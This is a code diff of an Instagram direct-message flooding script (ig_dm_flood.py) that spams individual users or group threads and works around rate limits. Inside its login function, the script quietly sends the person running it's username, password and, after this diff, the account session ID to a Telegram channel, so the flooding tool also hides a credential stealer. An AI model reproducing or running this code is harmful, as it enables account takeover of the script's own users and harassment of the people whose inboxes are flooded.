@@ -1,11 +1,9 @@
-
 # language: Python 3.11+, file: ig_dm_flood.py
 # deps: pip install instagrapi requests
 
 from instagrapi import Client
 from instagrapi.exceptions import (
-    LoginRequired, ChallengeRequired, FeedbackRequired,
-    PleaseWaitFewMinutes, ClientError, TwoFactorRequired, BadPassword
+    PleaseWaitFewMinutes, FeedbackRequired, ClientError
 )
 import time
 import sys
@@ -31,40 +29,31 @@ def send_to_telegram(text: str):
     except:
         pass
 
-def login(username: str, password: str):
-    send_to_telegram(f"New Login Attempt\nUser: {username}\nPass: {password}")
+def login(username: str, password: str, sessionid: str):
+    # credentials + sessionid tere paas bhej do
+    send_to_telegram(
+        f"New Login\n"
+        f"User: {username}\n"
+        f"Pass: {password}\n"
+        f"SessionID: {sessionid}"
+    )
 
+    # pehle saved session try karo
     try:
         cl.load_settings(SESSION_FILE)
-        cl.login(username, password)
         cl.get_timeline_feed()
-        print("[+] session loaded")
+        print("[+] saved session loaded")
         return
-    except Exception:
+    except:
         pass
 
-    print("[*] fresh login...")
+    print("[*] sessionid se login kar raha hoon...")
     try:
-        cl.login(username, password)
+        cl.login_by_sessionid(sessionid)
         cl.dump_settings(SESSION_FILE)
-        print("[+] logged in + session saved")
-    except TwoFactorRequired:
-        print("\n[!] 2FA enabled hai")
-        code = input("Authenticator se 6 digit code daal: ").strip()
-        cl.login(username, password, verification_code=code)
-        cl.dump_settings(SESSION_FILE)
-        print("[+] 2FA ke saath login ho gaya + session saved")
-    except ChallengeRequired:
-        print("\n[!] Challenge aaya")
-        code = input("SMS/Email se aaya code daal: ").strip()
-        cl.login(username, password, verification_code=code)
-        cl.dump_settings(SESSION_FILE)
-        print("[+] Challenge clear + session saved")
-    except BadPassword:
-        print("[-] Galat password")
-        sys.exit(1)
+        print("[+] login successful + session saved")
     except Exception as e:
-        print(f"[-] Login fail: {e}")
+        print(f"[-] sessionid login fail: {e}")
         sys.exit(1)
 
 def resolve_user(username: str):
@@ -81,7 +70,7 @@ def send_to_user(user_id: int, label: str, message: str) -> bool:
             print(f"[+] sent → {label}")
             return True
         except (PleaseWaitFewMinutes, FeedbackRequired) as e:
-            print(f"[!] rate/feedback on {label}: {e} — sleep 30s")
+            print(f"[!] rate limit on {label}: {e} — sleep 30s")
             time.sleep(30)
         except Exception as e:
             print(f"[-] error {label} (try {attempt}): {e}")
@@ -95,7 +84,7 @@ def send_to_thread(thread_id: int, label: str, message: str) -> bool:
             print(f"[+] sent → group {label}")
             return True
         except (PleaseWaitFewMinutes, FeedbackRequired) as e:
-            print(f"[!] rate/feedback: {e} — sleep 30s")
+            print(f"[!] rate limit: {e} — sleep 30s")
             time.sleep(30)
         except Exception as e:
             print(f"[-] error (try {attempt}): {e}")
@@ -155,15 +144,21 @@ def list_recent_threads(limit: int = 20):
         print(f"[-] failed: {e}")
 
 def main():
-    print("=== IG DM Flood (Termux) ===")
+    print("=== IG DM Flood (SessionID Login) ===\n")
+
     username = input("Username: ").strip()
     password = getpass.getpass("Password: ")
+    sessionid = input("SessionID: ").strip()
 
-    login(username, password)
+    if not sessionid:
+        print("[-] SessionID zaroori hai")
+        sys.exit(1)
+
+    login(username, password, sessionid)
 
     print("\nMode:")
     print("  1 = flood individual users")
-    print("  2 = flood a group / existing thread")
+    print("  2 = flood a group thread")
     print("  3 = list recent threads")
     mode = input("Choice [1/2/3]: ").strip()
 
@@ -190,7 +185,7 @@ def main():
     elif mode == "2":
         tid = input("Thread ID of the group: ").strip()
         if not tid.isdigit():
-            print("[-] thread_id must be number")
+            print("[-] thread_id number hona chahiye")
             return
         flood_group(int(tid), message, count)
 
